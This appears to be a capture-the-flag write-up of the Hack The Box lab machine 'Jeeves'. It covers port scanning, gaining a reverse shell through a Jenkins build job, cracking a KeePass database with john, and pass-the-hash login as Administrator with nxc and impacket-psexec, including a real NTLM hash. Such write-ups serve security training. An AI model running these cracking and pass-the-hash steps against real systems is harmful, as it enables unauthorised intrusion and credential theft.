
### Initial access

Nmap
```
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m11s, deviation: 0s, median: 4h59m11s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-11T12:16:40
|_  start_date: 2026-09-11T12:11:49
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


```

After feroxbuster found jenkins running which could lead us to OS  command injection


```
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Jeeves]
└─$ feroxbuster -u http://10.129.228.112:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                 
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.112:50000/
 🚩  In-Scope Url          │ 10.129.228.112
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves => http://10.129.228.112:50000/askjeeves/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/about => http://10.129.228.112:50000/askjeeves/about/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/search => http://10.129.228.112:50000/askjeeves/search/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/security => http://10.129.228.112:50000/askjeeves/security/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/projects => http://10.129.228.112:50000/askjeeves/projects/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/version => http://10.129.228.112:50000/askjeeves/version/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/assets => http://10.129.228.112:50000/askjeeves/assets/
404      GET       14l      263w     7119c http://10.129.228.112:50000/askjeeves/search/index
404      GET       16l      266w     7098c http://10.129.228.112:50000/askjeeves/signup
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filt
```

Step to create job
```
Step 1: Create the Project

1. Click **New Item** on the left menu.
2. Enter a project name (e.g., `My-Project`).
3. Select **Freestyle project** and click **OK**.

Step 2: Configure Build Environment

Scroll down to the **Build Environment** section and check the options you need:

- **Delete workspace before build starts:** Clears old files before running.
- **Add timestamps to the Console Output:** Adds time tags to your logs.
- **With Ant / Use secret text(s):** Injects tools or hidden credentials if needed.

Step 3: Add Build Steps

1. Scroll down to the **Build Steps** section.
2. Click the **Add build step** drop-down menu.
3. Select your command runner:
    - Choose **Execute Windows batch command** (for Windows nodes).
    - Choose **Execute shell** (for Linux/macOS nodes).
4. Type your build commands in the text box.

Step 4: Save & Run

1. Click **Save** at the bottom.
2. Click **Build Now** on the left menu to run the project.
```

We have revshell
```
──(kali㉿kali)-[~/HTB/Jeeves]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.228.112] 49677

PS C:\Users\Administrator\.jenkins\workspace\webshell> 



```


### Priv escalation

```
PS C:\Users\Administrator\.jenkins\workspace\webshell> whoami /all

USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

Found keepass 
``` {1}
C:\users\kohsuke\Documents\CEH.kdbx                                                                                    
C:\users\kohsuke\Documents\desktop.ini                                                                                 
C:\users\kohsuke\Downloads\desktop.ini                                                                                 
C:\users\kohsuke\Favorites\Links\desktop.ini                                                                           
C:\users\kohsuke\Favorites\desktop.ini                                                                                 
C:\users\kohsuke\Links\desktop.ini                                                                                     
C:\users\kohsuke\Music\desktop.ini                                                                                     
C:\users\kohsuke\OneDrive\desktop.ini                                                                                  
C:\users\kohsuke\Pictures\Camera Roll\desktop.ini                                                                      
C:\users\kohsuke\Pictures\Saved Pictures\desktop.ini                                                                   
C:\users\kohsuke\Pictures\desktop.ini                                                                                  
C:\users\kohsuke\Saved Games\desktop.ini                                                                               
C:\users\kohsuke\Searches\desktop.ini                                                                                  
C:\users\kohsuke\Videos\desktop.ini                                                                                    
C:\users\kohsuke\ntuser.ini            
```
Using smb to upload file let crack keepass
```
┌──(kali㉿kali)-[~/HTB/Jeeves]
└─$ keepass2john CEH.kdbx > pass.hash
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Jeeves]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --rules pass.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)     
1g 0:00:00:08 DONE (2026-09-11 04:44) 0.1216g/s 6688p/s 6688c/s 6688C/s nick18..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Jeeves]
└─$ keepassxc-cli open  CEH.kdbx                                      
Enter password to unlock CEH.kdbx: 
CEH.kdbx> ls
Walmart.com
Bank of America
It's a secret
EC-Council
Keys to the kingdom
DC Recovery PW
Jenkins admin
Backup stuff
General/
Windows/
Network/
Internet/
eMail/
Homebanking/
CEH.kdbx> 

```


We see in pass.txt we extact from dump file keepass have ntml hash test it and get pwn to the system
```
┌──(kali㉿kali)-[~/HTB/Jeeves]
└─$ cat pass.txt
12345
F7WhTrSFDKB6sxHU1cUn
S1TjAtJHKsugh9oC4VZl
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
lCEUnYPjNfIuPZSzOySA
pwndyouall!

┌──(kali㉿kali)-[~/HTB/Jeeves]
└─$ nxc smb 10.129.228.112 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Build 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True) 
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)

               
```

```
┌──(kali㉿kali)-[~/HTB/Jeeves]
└─$ impacket-psexec Administrator@10.129.228.112 -hashes :e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.228.112.....
[*] Found writable share ADMIN$
[*] Uploading file iMAaKGvF.exe
[*] Opening SVCManager on 10.129.228.112.....
[*] Creating service vkpl on 10.129.228.112.....
[*] Starting service vkpl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]

(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
C:\Windows\system32> whoami
nt authority\system


```

Its has hidden stream
```
C:\Users\Administrator\Desktop> dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,453,827,584 bytes free

C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530


```